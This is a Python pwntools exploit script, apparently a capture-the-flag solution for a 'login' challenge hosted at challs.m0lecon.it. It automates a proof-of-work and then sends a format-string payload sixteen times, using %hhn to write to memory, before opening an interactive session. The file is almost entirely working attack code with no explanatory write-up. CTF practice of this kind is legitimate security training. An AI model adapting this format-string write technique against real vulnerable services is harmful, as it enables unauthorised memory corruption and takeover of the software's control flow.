#!/usr/bin/python

from pwn import *
import sys
from hashlib import sha256

remote_ip, port = 'challs.m0lecon.it', 5556
binary = './login'
brkpts = '''
'''

elf = ELF("login")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

if len(sys.argv) > 1:
    if sys.argv[1] == '1':
        io = remote(remote_ip, port)
        context.noptrace = True
        solvepow(io, n = 5)
    else:
        io = gdb.debug(binary, brkpts)

else:
    io = process(binary)
    
if __name__ == "__main__":
    for i in range(16):
        reu("summed to ")
        v7 = int(re(1))
        payload = "%*9$c" + "%{}c".format(v7) + "%8$hhn"
        sl(payload)

    io.interactive()
